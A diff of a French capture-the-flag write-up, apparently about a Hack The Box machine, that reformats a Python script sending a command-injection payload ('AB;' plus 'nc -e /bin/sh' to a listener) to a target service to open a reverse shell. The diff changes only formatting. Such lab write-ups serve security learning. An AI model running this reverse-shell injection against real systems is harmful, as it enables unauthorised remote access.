@@ -122,34 +122,36 @@ Voilà comme vous pouvez le voir **sock.put("AB;" + payload.encoded + "\n")** l'
     
 Une commande basique et nous recevons bien les paquets ICMP. J'ai créé un outil en python pour faire un reverse shell.
 
-    #coding:utf-8
+```python
+#coding:utf-8
 
-    import sys
-    import socket
+import sys
+import socket
 
-    try:
-            # Let's test if the arguments are open during execution.
-            # The host and the port are the services to attack.
+try:
+    # Let's test if the arguments are open during execution.
+    # The host and the port are the services to attack.
 
-            HOST = sys.argv[1]
-            PORT = sys.argv[2]
+    HOST = sys.argv[1]
+    PORT = sys.argv[2]
 
-            # You will need to make a netcat to do the reverse shell.
-            # And it's something optional.
-    except IndexError as e:
-            sys.exit(e)
+    # You will need to make a netcat to do the reverse shell.
+    # And it's something optional.
+except IndexError as e:
+    sys.exit(e)
 
-    CMDS = "nc -e /bin/sh 127.0.0.1 1234" # Change this.
+CMDS = "nc -e /bin/sh 127.0.0.1 1234" # Change this.
 
-    def ArgumentTest():
-            ServiceDown = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            ServiceDown.connect((str(HOST), int(PORT)))
-            ServiceDown.send("AB;" + CMDS + "\n")
-            ServiceDown.recv(1024).decode()
+def ArgumentTest():
+    ServiceDown = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    ServiceDown.connect((str(HOST), int(PORT)))
+    ServiceDown.send("AB;" + CMDS + "\n")
+    ServiceDown.recv(1024).decode()
 
-    if __name__ == "__main__":
-            ArgumentTest()
-            
+if __name__ == "__main__":
+    ArgumentTest()
+```
+
 N'oubliez pas de modifier l'adresse IP dans la variable **CMDS** par défaut c'est l'adresse de loopback. L'utilisation est très simple.
 
 [![forthebadge made-with-python](https://image.noelshack.com/fichiers/2019/05/7/1549213189-capture-du-2019-02-03-17-59-40.png)](https://hackthebox.eu/)
